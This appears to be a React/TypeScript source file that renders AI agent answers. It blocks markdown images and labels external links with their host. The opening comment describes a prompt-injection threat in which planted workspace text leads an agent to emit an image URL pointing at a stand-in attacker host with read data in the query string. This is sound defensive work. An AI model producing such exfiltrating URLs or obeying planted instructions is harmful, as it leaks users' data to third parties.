// What an agent's markdown may do on the way to the screen (MIP-723).
//
// An agent answer is written by a model that has read workspace text, and
// some of that text may have been written to steer it. The one thing a
// planted instruction can make the RENDERER do, rather than the reader,
// is fetch: `![](https://attacker.example/p?d=<what the agent just read>)`
// is a request the browser sends the moment the answer paints, with no
// click and nothing on screen to notice. So every surface that renders
// model-authored markdown takes its `img` and its plain links from here.
//
//   * `img` is never rendered. The answer still shows THAT an image was
//     there — an inert chip naming the host — so a reader who wonders why
//     the agent tried to show them a picture of evil.example can.
//   * An external link keeps working, but says where it goes: the host is
//     printed after the label, because a link whose label is "the design
//     doc" and whose target is an attacker's server is the click-through
//     version of the same exfiltration. Same-origin links are the app's
//     own and stay as they were.
//
// Neither carries words, deliberately: a host name reads the same in every
// locale, so there are no strings here to fall out of translation.

import type { ReactNode } from "react";
import ImageNotSupportedRoundedIcon from "@mui/icons-material/ImageNotSupportedRounded";
import { Box } from "@mui/joy";
import type { Components } from "react-markdown";

/** The host a URL points at, or `null` when it isn't an absolute
 *  http(s) URL on another origin. */
export const externalHost = (href: string | undefined): string | null => {
    if (!href) return null;
    let url: URL;
    try {
        url = new URL(href, window.location.href);
    } catch {
        return null;
    }
    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
    if (url.origin === window.location.origin) return null;
    return url.host;
};

const hostSx = {
    ml: 0.5,
    fontSize: "0.85em",
    opacity: 0.7,
    whiteSpace: "nowrap",
    // The label is the link; the host is a caption on it, and reads as
    // one only if it doesn't inherit the underline.
    textDecoration: "none",
    display: "inline-block",
} as const;

/** A link out of the app, labelled with where it goes. Anything that
 *  isn't an external http(s) URL (`mailto:`, a relative path) renders as
 *  an ordinary new-tab anchor, as the renderers did before. */
export const ExternalLink = ({ href, children }: { href?: string; children?: ReactNode }) => {
    // `defaultUrlTransform` blanks javascript: and data: URLs; a blank
    // href would render as a link to the current page, which looks live
    // and isn't.
    if (!href) return <>{children}</>;
    const host = externalHost(href);
    return (
        <a href={href} rel="noopener noreferrer nofollow" target="_blank">
            {children}
            {host ? (
                <Box component="span" data-external-host="" sx={hostSx}>
                    ({host})
                </Box>
            ) : null}
        </a>
    );
};

/** Stands in for an image the answer tried to show, without loading it. */
export const BlockedImage = ({ src }: { src?: string }) => {
    let host: string | null = null;
    try {
        host = src ? new URL(src, window.location.href).host : null;
    } catch {
        host = null;
    }
    return (
        <Box
            component="span"
            data-blocked-image=""
            title={src || undefined}
            sx={{
                display: "inline-flex",
                alignItems: "center",
                gap: 0.5,
                px: 0.75,
                borderRadius: "4px",
                fontSize: "0.85em",
                opacity: 0.75,
                border: "1px dashed currentColor",
                verticalAlign: "middle",
            }}
        >
            <ImageNotSupportedRoundedIcon sx={{ fontSize: "1.1em" }} aria-hidden />
            {host}
        </Box>
    );
};

/** Spread into every model-authored `ReactMarkdown`'s `components`, ahead
 *  of the surface's own overrides. `a` is supplied too, for surfaces that
 *  have no link handling of their own; one that does (citations) keeps its
 *  own and sends plain hrefs to `ExternalLink`. */
export const agentMarkdownComponents: Components = {
    img: ({ src }) => <BlockedImage src={typeof src === "string" ? src : undefined} />,
    a: ({ href, children }) => <ExternalLink href={href}>{children}</ExternalLink>,
};
